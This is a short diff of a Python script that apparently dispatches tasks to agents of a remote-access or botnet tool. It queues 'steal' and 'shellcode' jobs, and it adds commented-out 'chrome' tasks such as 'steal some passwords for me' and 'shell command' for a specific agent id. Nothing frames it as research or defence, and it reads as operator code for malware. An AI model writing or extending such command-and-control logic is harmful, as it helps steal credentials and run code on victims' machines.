@@ -71,3 +71,6 @@ if __name__ == "__main__":
     create_task(command_type="steal", cmd="", agent_id="1740948824")
     create_task(command_type="shellcode", cmd="", agent_id="1740948824")
     create_task(command_type="change_config", cmd="", agent_id="1740948824")
+    # create_task(command_type="chrome", cmd="steal some passwords for me", agent_id="5c5c385909adcbf559783b84ee2b0a1f")
+    # create_task(command_type="chrome", cmd="shell command", agent_id="5c5c385909adcbf559783b84ee2b0a1f")
+    # create_task(command_type="chrome", cmd="change desktop background", agent_id="5c5c385909adcbf559783b84ee2b0a1f")
